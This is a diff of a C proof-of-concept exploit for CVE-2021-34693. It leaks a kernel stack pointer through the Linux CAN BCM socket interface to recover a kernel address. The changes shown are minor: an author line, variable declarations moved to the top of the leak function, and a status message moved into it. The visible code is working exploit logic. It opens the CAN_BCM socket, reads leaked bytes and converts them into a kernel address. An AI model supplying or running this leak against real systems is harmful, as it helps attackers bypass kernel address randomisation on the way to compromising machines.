@@ -10,6 +10,8 @@
 // https://nvd.nist.gov/vuln/detail/CVE-2021-34693
 // https://www.openwall.com/lists/oss-security/2021/06/15/1
 // https://www.openwall.com/lists/oss-security/2021/06/15/1/2
+// ---
+// <bcoles@gmail.com>
 
 #include <fcntl.h>
 #include <linux/can.h>
@@ -55,7 +57,12 @@ unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
     struct bcm_msg_head b;
     struct canfd_frame f;
   } msg;
+  char addrs[9];
   char buf[sizeof(msg)];
+  char *endptr;
+  unsigned long addr = 0;
+
+  printf("[.] trying bcm_msg_head struct stack pointer leak ...\n");
 
   sock = socket(AF_CAN, SOCK_DGRAM, CAN_BCM);
 
@@ -82,12 +89,10 @@ unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
   if (sizeof(buf) < 112)
     return 0;
 
-  char addrs[9];
   snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x", buf[39], buf[38], buf[37],
            buf[36]);
 
-  char *endptr;
-  unsigned long addr = (unsigned long)strtoull(addrs, &endptr, 16);
+  addr = (unsigned long)strtoull(addrs, &endptr, 16);
 
   if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
     return addr;
@@ -96,8 +101,6 @@ unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
 }
 
 int main(int argc, char **argv) {
-  printf("[.] trying bcm_msg_head struct stack pointer leak ...\n");
-
   unsigned long addr = get_kernel_addr_from_bcm_msg_head_struct();
   if (!addr)
     return 1;
